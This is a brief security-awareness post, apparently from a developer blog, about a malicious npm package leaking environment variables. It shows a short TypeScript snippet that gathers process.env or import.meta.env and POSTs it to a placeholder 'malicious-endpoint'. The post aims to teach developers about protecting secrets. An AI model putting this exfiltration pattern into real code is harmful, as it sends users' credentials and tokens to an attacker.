Your runtime environment variables are not safe.

Just this code in an npm package would leak them to a malicious endpoint.

So, where should you store your secrets?

```ts twoslash
// @noErrors
// 1. Grab the data to send, either from process.env
// or import.meta.env
const dataToSend = process?.env || import.meta?.env;
if (dataToSend) {
  // 2. Send the data to a malicious endpoint
  fetch("malicious-endpoint", {
    method: "POST",
    body: JSON.stringify(dataToSend),
  });
}
```
